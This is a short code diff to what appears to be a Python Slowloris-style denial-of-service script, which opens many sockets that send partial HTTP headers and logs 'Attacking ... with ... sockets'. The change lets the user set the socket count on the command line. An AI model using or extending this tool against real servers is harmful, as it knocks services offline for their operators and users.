@@ -26,13 +26,20 @@ def init_socket(ip):
         s.send("{}\r\n".format(header).encode("utf-8"))
     return s
 
+def is_number(s):
+    try:
+        float(s)
+        return True
+    except ValueError:
+        return False
+
 def main():
-    if len(sys.argv) != 2:
-        print("Usage: {} example.com".format(sys.argv[0]))
+    if len(sys.argv) < 2 or len(sys.argv) > 3:
+        print("Usage: {} example.com [threads]".format(sys.argv[0]))
         return
 
     ip = sys.argv[1]
-    socket_count = 200
+    socket_count = int(sys.argv[2]) if len(sys.argv) > 2 and is_number(sys.argv[2]) else 200
     log("Attacking {} with {} sockets.".format(ip, socket_count))
 
     log("Creating sockets...")
